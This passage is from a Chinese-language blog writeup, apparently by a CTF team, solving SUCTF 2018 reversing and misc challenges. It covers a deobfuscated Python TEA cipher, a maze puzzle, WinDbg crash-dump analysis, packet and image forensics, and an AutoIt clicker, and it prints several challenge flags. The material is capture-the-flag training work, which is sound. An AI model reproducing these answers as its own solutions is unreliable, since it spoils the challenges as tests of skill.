<span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> c[<span class="number">180</span>] = &#123; <span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">16</span>,<span class="number">19</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">20</span>,<span class="number">23</span>,<span class="number">22</span>,<span class="number">19</span>,<span class="number">28</span>,<span class="number">25</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">31</span>,<span class="number">36</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">39</span>,<span class="number">36</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">43</span>,<span class="number">36</span>,<span class="number">45</span>,<span class="number">38</span>,<span class="number">47</span>,<span class="number">56</span>,<span class="number">49</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">52</span>,<span class="number">61</span>,<span class="number">62</span>,<span class="number">55</span>,<span class="number">48</span>,<span class="number">57</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">60</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">66</span>,<span class="number">66</span>,<span class="number">68</span>,<span class="number">68</span>,<span class="number">70</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">74</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">77</span>,<span class="number">79</span>,<span class="number">78</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">85</span>,<span class="number">84</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">89</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">91</span>,<span class="number">92</span>,<span class="number">93</span>,<span class="number">94</span>,<span class="number">94</span>,<span class="number">96</span>,<span class="number">96</span>,<span class="number">99</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">103</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">107</span>,<span class="number">107</span>,<span class="number">108</span>,<span class="number">109</span>,<span class="number">110</span>,<span class="number">110</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">117</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">120</span>,<span class="number">121</span>,<span class="number">123</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">125</span>,<span class="number">127</span>,<span class="number">127</span>,<span class="number">129</span>,<span class="number">129</span>,<span class="number">131</span>,<span class="number">131</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">143</span>,<span class="number">136</span>,<span class="number">137</span>,<span class="number">138</span>,<span class="number">139</span>,<span class="number">140</span>,<span class="number">141</span>,<span class="number">142</span>,<span class="number">135</span>,<span class="number">152</span>,<span class="number">145</span>,<span class="number">146</span>,<span class="number">147</span>,<span class="number">148</span>,<span class="number">149</span>,<span class="number">150</span>,<span class="number">151</span>,<span class="number">152</span>,<span class="number">153</span>,<span class="number">154</span>,<span class="number">154</span>,<span class="number">156</span>,<span class="number">156</span>,<span class="number">158</span>,<span class="number">158</span>,<span class="number">160</span>,<span class="number">160</span>,<span class="number">162</span>,<span class="number">162</span>,<span class="number">164</span>,<span class="number">164</span>,<span class="number">166</span>,<span class="number">166</span>,<span class="number">168</span>,<span class="number">168</span>,<span class="number">170</span>,<span class="number">170</span>,<span class="number">172</span>,<span class="number">172</span>,<span class="number">174</span>,<span class="number">174</span>,<span class="number">176</span>,<span class="number">177</span>,<span class="number">178</span>,<span class="number">179</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">char</span> flag[<span class="number">31</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"flag format: SUCTF&#123;xxxxxxxxxxxxxxx&#125;\n"</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please Input Key:"</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; key;</span><br><span class="line">	key %= <span class="number">65536</span>;</span><br><span class="line"></span><br><span class="line">	flag[<span class="number">30</span>] = <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">while</span> (flag[<span class="number">30</span>]) &#123;</span><br><span class="line">		flag[<span class="number">30</span>]--;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">22</span>;</span><br><span class="line">		<span class="keyword">while</span> (i) &#123;</span><br><span class="line">			i--;</span><br><span class="line">			flag[i] |= ((((c[flag[<span class="number">30</span>] * <span class="number">22</span> + i]) &gt;&gt; ((key &gt;&gt; (<span class="number">2</span> * flag[<span class="number">30</span>])) &amp; <span class="number">0x03</span>)) &amp; <span class="number">0x01</span>) &lt;&lt; flag[<span class="number">30</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="HelloPython"><a href="#HelloPython" class="headerlink" title="HelloPython"></a>HelloPython</h3><p>一道经过混淆的Python逆向，题目给出的是一个经过编译的字节码文件和一段密文，通过uncompyle6可以反编译出源码，源码通过onelinerizer混淆压缩为一行代码，需要先整理分析代码，然后写出解密算法。</p>
+<p>经过整理分析后的代码，因为混淆方式是通过lambda函数和列表递推表达式实现的，先解析函数参数，所以代码整体上是倒序执行的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">(lambda __operator, __print, __g, __contextlib, __y:  # __operator=operator, __print=print, __g=globals(), __y用于构造循环</span><br><span class="line">    [</span><br><span class="line">        (lambda __mod: [</span><br><span class="line">            [</span><br><span class="line">                [</span><br><span class="line">                    (lambda __items, __after, __sentinel: # __items=iter(p_text.split(&apos;_&apos;)), __after为加密函数, __sentinel=[]</span><br><span class="line">                        __y(lambda __this: lambda: (lambda __i: [ # __i为当前循环到的__items</span><br><span class="line">                            (</span><br><span class="line">                                lambda __out: (</span><br><span class="line">                                    lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: __this())][2]</span><br><span class="line">                                )(</span><br><span class="line">                                    __contextlib.nested(</span><br><span class="line">                                        type(</span><br><span class="line">                                            # 失败则退出程序</span><br><span class="line">                                            &apos;except&apos;, (), &#123;&apos;__enter__&apos;: lambda self: None, &apos;__exit__&apos;: lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [((sys.exit(0), lambda after: after())[1])]][0])&#125;</span><br><span class="line">                                        )(), </span><br><span class="line">                                        type(</span><br><span class="line">                                            # 尝试将 word以16进制转换为整形 存入 v</span><br><span class="line">                                            &apos;try&apos;, (), &#123;&apos;__enter__&apos;: lambda self: None, &apos;__exit__&apos;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((v.append(int(word, 16)), (lambda __after: __after()))[1])]][0]&#125;</span><br><span class="line">                                        )()</span><br><span class="line">                                        )</span><br><span class="line">                                )</span><br><span class="line">                                # word = __i</span><br><span class="line">                            )([None]) for __g[&apos;word&apos;] in [(__i)]</span><br><span class="line">                            # 循环__items</span><br><span class="line">                        ][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))()</span><br><span class="line">                    )</span><br><span class="line">                    (</span><br><span class="line">                        # __items=iter(p_text.split(&apos;_&apos;))</span><br><span class="line">                        iter(p_text.split(&apos;_&apos;)), lambda: [</span><br><span class="line">                            [</span><br><span class="line">                                [</span><br><span class="line">                                    [</span><br><span class="line">                                        [</span><br><span class="line">                                            [</span><br><span class="line">                                                [</span><br><span class="line">                                                    (</span><br><span class="line">                                                        lambda __after: __y( # __after为后面参数中输出结果的lambda</span><br><span class="line">                                                            lambda __this: lambda: ( # if n &gt; 0 执行这部分代码，否则执行__after</span><br><span class="line">                                                                lambda __target: [</span><br><span class="line">                                                                    (</span><br><span class="line">                                                                        lambda __target: [</span><br><span class="line">                                                                            (</span><br><span class="line">                                                                                lambda __target: [</span><br><span class="line">                                                                                    # 循环调用__this()，效果等同于 while n &gt; 0</span><br><span class="line">                                                                                    # n -= 1</span><br><span class="line">                                                                                    # z.value += ( y.value &lt;&lt; 4 ) + k[2] ^ y.value + x.value ^ ( y.value &gt;&gt; 5 ) + k[3]</span><br><span class="line">                                                                                    [__this() for __g[&apos;n&apos;] in [(__operator.isub(__g[&apos;n&apos;], 1))]][0] for __target.value in [(__operator.iadd(__target.value, ((((y.value &lt;&lt; 4) + k[2]) ^ (y.value + x.value)) ^ ((y.value &gt;&gt; 5) + k[3]))))]</span><br><span class="line">                                                                                ][0]</span><br><span class="line">                                                                                # __target.value += ( z.value &lt;&lt; 4 ) + k[0] ^ z.value + x.value ^ ( z.value &gt;&gt; 5 ) + k[1]</span><br><span class="line">                                                                            )(z) for __target.value in [(__operator.iadd(__target.value, ((((z.value &lt;&lt; 4) + k[0]) ^ (z.value + x.value)) ^ ((z.value &gt;&gt; 5) + k[1]))))]</span><br><span class="line">                                                                        ][0]</span><br><span class="line">                                                                        # __target.value += u</span><br><span class="line">                                                                    )(y) for __target.value in [(__operator.iadd(__target.value, u))]</span><br><span class="line">                                                                ][0]</span><br><span class="line">                                                            )(x) if (n &gt; 0) else __after() # 见上文</span><br><span class="line">                                                        )()</span><br><span class="line">                                                    )(</span><br><span class="line">                                                        # 将z.value和y.value分别赋值给w[0]和w[1], 然后输出结果</span><br><span class="line">                                                        lambda: [[(__print(&apos;&apos;.join(map(hex, w)).replace(&apos;0x&apos;, &apos;&apos;).replace(&apos;L&apos;, &apos;&apos;)), None)[1] for w[1] in [(z.value)]][0] for w[0] in [(y.value)]][0]</span><br><span class="line">                                                    ) for __g[&apos;w&apos;] in [([0, 0])]  # w = [0,0]</span><br><span class="line">                                                ][0] for __g[&apos;n&apos;] in [(32)]  # n = 32</span><br><span class="line">                                            ][0] for __g[&apos;u&apos;] in [(2654435769)]  # u = 0x9e3779b9</span><br><span class="line">                                        ][0] for __g[&apos;x&apos;] in [(c_uint32(0))]  # x = c_uint32(0)</span><br><span class="line">                                    ][0] for __g[&apos;z&apos;] in [(c_uint32(v[1]))]  # z = c_uint32(v[1])</span><br><span class="line">                                ][0] for __g[&apos;y&apos;] in [(c_uint32(v[0]))]  # y = c_uint32(v[0])</span><br><span class="line">                            ][0] for __g[&apos;k&apos;] in [([3735928559, 590558003, 19088743, 4275878552])]  # k = [0xdeadbeef, 0x23333333, 0x01234567, 0xfedcba98]</span><br><span class="line">                        ][0], []</span><br><span class="line">                    ) for __g[&apos;v&apos;] in [([])]  # v = []</span><br><span class="line">                ][0] for __g[&apos;p_text&apos;] in [(raw_input(&apos;plain text:\n&gt; &apos;))]  # p_text = raw_input(&quot;plain text:\n&gt; &quot;)</span><br><span class="line">            ][0] for __g[&apos;c_uint32&apos;] in [(__mod.c_uint32)]  # c_uint32 = ctypes.c_uint32</span><br><span class="line">        ][0])</span><br><span class="line">        (__import__(&apos;ctypes&apos;, __g, __g, (&apos;c_uint32&apos;,), 0)) for __g[&apos;sys&apos;] in [(__import__(&apos;sys&apos;, __g, __g))] # from ctypes import c_uint32    import sys</span><br><span class="line">    ][0]</span><br><span class="line">)</span><br><span class="line">(__import__(&apos;operator&apos;, level=0), __import__(&apos;__builtin__&apos;, level=0).__dict__[&apos;print&apos;], globals(), __import__(&apos;contextlib&apos;, level=0), (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))</span><br></pre></td></tr></table></figure></p>
+<p>加密解密代码(TEA)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def encipher(v, k):</span><br><span class="line">    y = c_uint32(v[0])</span><br><span class="line">    z = c_uint32(v[1])</span><br><span class="line">    sum = c_uint32(0)</span><br><span class="line">    delta = 0x9e3779b9</span><br><span class="line">    n = 32</span><br><span class="line">    w = [0,0]</span><br><span class="line"></span><br><span class="line">    while(n&gt;0):</span><br><span class="line">        sum.value += delta</span><br><span class="line">        y.value += ( z.value &lt;&lt; 4 ) + k[0] ^ z.value + sum.value ^ ( z.value &gt;&gt; 5 ) + k[1]</span><br><span class="line">        z.value += ( y.value &lt;&lt; 4 ) + k[2] ^ y.value + sum.value ^ ( y.value &gt;&gt; 5 ) + k[3]</span><br><span class="line">        n -= 1</span><br><span class="line"></span><br><span class="line">    w[0] = y.value</span><br><span class="line">    w[1] = z.value</span><br><span class="line">    return w</span><br><span class="line"></span><br><span class="line">def decipher(v, k):</span><br><span class="line">    y = c_uint32(v[0])</span><br><span class="line">    z = c_uint32(v[1])</span><br><span class="line">    sum = c_uint32(0xc6ef3720)</span><br><span class="line">    delta = 0x9e3779b9</span><br><span class="line">    n = 32</span><br><span class="line">    w = [0,0]</span><br><span class="line"></span><br><span class="line">    while(n&gt;0):</span><br><span class="line">        z.value -= ( y.value &lt;&lt; 4 ) + k[2] ^ y.value + sum.value ^ ( y.value &gt;&gt; 5 ) + k[3]</span><br><span class="line">        y.value -= ( z.value &lt;&lt; 4 ) + k[0] ^ z.value + sum.value ^ ( z.value &gt;&gt; 5 ) + k[1]</span><br><span class="line">        sum.value -= delta</span><br><span class="line">        n -= 1</span><br><span class="line"></span><br><span class="line">    w[0] = y.value</span><br><span class="line">    w[1] = z.value</span><br><span class="line">    return w</span><br></pre></td></tr></table></figure></p>
+<h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>非常传统而基础的rev</p>
+<p><strong>MD5</strong><br>题目一开始的时候给了一串奇怪的数字，如果逆向的话会发现这是一段md5（检查魔数可得），直接搜会发现是nuaa的数字，然后便可解开这段内容。<br>Tips:不是字符串的nuaa，而是其数字形式</p>
+<p><strong>迷宫</strong><br>题目会用上一题的迷宫得到的数对程序中的<code>404040</code>位置进行解密，解密后会发现这是一个迷宫。并且<code>UDLR</code>分别表示四个方向，那么只要走出迷宫即可。此处走出迷宫的字符串为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RRRRRRRRRRUUUUUUUUUULLLLLLLU</span><br></pre></td></tr></table></figure></p>
+<p>程序中有一段逻辑会对输入进行翻译，当翻译结果如上的时候才能够通行。</p>
+<p><img src="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-game/writeup/images/game0.png" alt></p>
+<p>相当于是将每个字节的两个bit作为UDLR的一个对应关系，解密后得到此时的输入为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">170 170 165 85 85 255 253</span><br></pre></td></tr></table></figure></p>
+<p><strong>最后的check</strong><br>到这段之后，会发现程序会释放一个加密的程序并且跳转上去，检查后发现是一个简单的逻辑异或，最后得到答案:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dr1v3r_Is_s0_m3ssy</span><br></pre></td></tr></table></figure></p>
+<h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><p>这个题目可以使用IDA来解，不过我试了一下效果并不好（可能本人IDA用的不熟练），不如直接用windbg来的快</p>
+<p><strong>1. 找到crash的原因</strong><br>一个dmp的产生，必然意味着程序本身出现了问题。所以应该首先通过分析找到当前的问题所在。使用<code>!analyze -v</code>分析可以知道，当前程序发生了堆溢出:<br><img src="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp04.png" alt><br>检查当前的程序调用栈，可以看如下信息:<br><img src="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp05.png" alt><br>可以看到程序主体<strong>ForDumpPractice</strong>中调用了free。显然是这个free的内容出现了问题，于是我们直接跟踪到这段代码相关的地方:<br><img src="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp07.png" alt><br>这边我的windbg有一些符号没有解析，不过可以使用指令查看。这段的内容如果完整看下来，会发现是个如下的逻辑:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 申请一个堆，大小为4</span><br><span class="line">2. 将参数传入到这个堆块中，但是长度为101</span><br><span class="line">3. free当前堆</span><br></pre></td></tr></table></figure></p>
+<p>所以发生了堆溢出</p>
+<p><strong>2. 找到flag</strong><br>既然分析了崩溃原因，那么我们看一下这个程序本身要做什么。继续分析dmp，会在最后找到一个prinf函数，并且可以看到里面的内容:<br><img src="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp06.png" alt><br>这里可以暗道，这个地方的字符串是一个输出flag的东西。逆推可得，此时<code>[esp - 14h]+1</code>中存放有flag。并且在这段逻辑中，可以发现有一个简单的对程序进行解密的内容。这里通过将这个程序还原，大致可以得到如下的逻辑<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [ebp- 1Dh]:i</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; [[ebp - <span class="number">14</span>h]]; i ++)&#123;</span><br><span class="line">	[[ebp<span class="number">-14</span>h]+<span class="number">1</span>+i] = ([[ebp - <span class="number">14</span>h]] + i) ^ [[ebp<span class="number">-14</span>h]+<span class="number">1</span>+i]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 大致猜测，ebp-14h可能是一个结构体</span></span><br></pre></td></tr></table></figure></p>
+<p>那么这个[ebp - 14h]中的数据怎么得到呢?回到程序开头，我们发现这个值是参数传入的，并且存放在了堆中。于是此时我们可以查看栈/堆，都能够翻到这个内容:<br>栈:<br><img src="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp08.png" alt><br>堆:<br><img src="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp09.png" alt></p>
+<p>剩下的就是解密，得到答案为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Dmp_Is_Useful&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="easy-vm-engine"><a href="#easy-vm-engine" class="headerlink" title="easy_vm_engine"></a>easy_vm_engine</h3><p>简单的vm，可以用angr很轻松的跑出来，这里贴下加密解密算法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">print(<span class="string">"encode"</span>)</span><br><span class="line">flag=list(<span class="string">'SUCTF&#123;e@sy_vmeng1ne&#125;'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag[i]=chr((ord(flag[i])-i)^i)</span><br><span class="line">    print(hex(ord(flag[i])))</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line">print(<span class="string">"decode"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    flag[i]=chr((ord(flag[i])^i)+i)</span><br><span class="line">    print(hex(ord(flag[i])))</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="follow-me"><a href="#follow-me" class="headerlink" title="follow-me"></a>follow-me</h3><p>使用wireshark分析数据包，过滤http发现是一个简单的web攻击流程，</p>
+<p>首先爆破后台再进行弱口令爆破，正确的口令即为flag值，在倒数第二个数据包。</p>
+<h3 id="single-dog"><a href="#single-dog" class="headerlink" title="single-dog"></a>single-dog</h3><p>使用foremost分离文件，发现存在文本文件，搜索aaencode解密即可得到flag。</p>
+<h3 id="stature"><a href="#stature" class="headerlink" title="stature"></a>stature</h3><p>简单的png隐写，用hex编辑器将图片改高，0x175改高即可。</p>
+<h3 id="one-image-3F"><a href="#one-image-3F" class="headerlink" title="one image %3F"></a>one image %3F</h3><p>B通道有hint提示盲水印，R通道与G通道解盲水印，得到flag</p>
+<h3 id="hidden"><a href="#hidden" class="headerlink" title="hidden"></a>hidden</h3><p>非常传统而基础的misc</p>
+<p><strong>zip/docx</strong><br>其实直接拖到Linux下就能够识别出是一个zip包，本身是一个word文档，于是直接在压缩包里面能够找到一半的flag:<code>_Yeah!}</code></p>
+<p><strong>qrcode</strong><br>发现flag只有一部分，于是继续观察文件，发现一个zip文件不可能这么大，于是用binwalk去查看，会发现里面有很多张图。将图都取出来会发现是一个二维码截图。将这些二维码拼接起来，扫出来是一个base64的字符串，解开之后会发现一大段内容，其中最后包含了另一半的flag<code>SUCTF{File_Format</code></p>
+<p>最后得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;File_Format_Yeah!&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="佛家妙语"><a href="#佛家妙语" class="headerlink" title="佛家妙语"></a>佛家妙语</h3><p>超级简单的几种编码与加密<br>与佛论禅——base46——base32——base16——base58</p>
+<h3 id="流量"><a href="#流量" class="headerlink" title="流量"></a>流量</h3><p>流量包可导出upload.php，分离得出加密的压缩包。<br>压缩包内有flag0,1,2,3，且内容都为4或6字符，利用crc32校验的爆破得出flag内容。<br>主要坑点在flag0，写脚本爆破预计2小时……但得出flag123后可猜测flag0为flag头SUCTF{，用crc32验证一下也可确定。</p>
+<h3 id="人类的本质"><a href="#人类的本质" class="headerlink" title="人类的本质"></a>人类的本质</h3><p>题目思路比较明确，就是点2333次以上，也有师傅通过逆向的方法解。<br>由于按钮设定了不可设置为焦点，使用autoit直接给控件发送点击命令。<br>控件的定位可以用autoit window info</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Run(<span class="string">"本质3.exe"</span>);</span><br><span class="line">WinWaitActive(<span class="string">"人类的本质是什么"</span>);</span><br><span class="line">$i=<span class="number">1</span> </span><br><span class="line">While $i&lt;=<span class="number">2333</span></span><br><span class="line"> ControlClick(<span class="string">"人类的本质是什么"</span>,<span class="string">""</span>,<span class="string">"ThunderRT6CommandButton15"</span>);</span><br><span class="line">      $i=$i+<span class="number">1</span> </span><br><span class="line">WEnd</span><br></pre></td></tr></table></figure>
+
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Writeup/" <i class="fa fa-tag">Writeup</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/uncategorized/flask-session/" rel="next" title="从hctf的两道web题谈flask客户端session机制">
+                <i class="fa fa-chevron-left"></i> 从hctf的两道web题谈flask客户端session机制
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/Web/java-deserialize/" rel="prev" title="java反序列化漏洞的一些利用链分析">
+                java反序列化漏洞的一些利用链分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Susers">
+          <p class="site-author-name" itemprop="name">Susers</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-name">Posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/susers" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.bxsteam.xyz/" title="BXS Team" target="_blank">BXS Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://asuri.org/" title="Asuri Team" target="_blank">Asuri Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/SEU-ITE/" title="SEU-ITE" target="_blank">SEU-ITE</a>
+                </li>
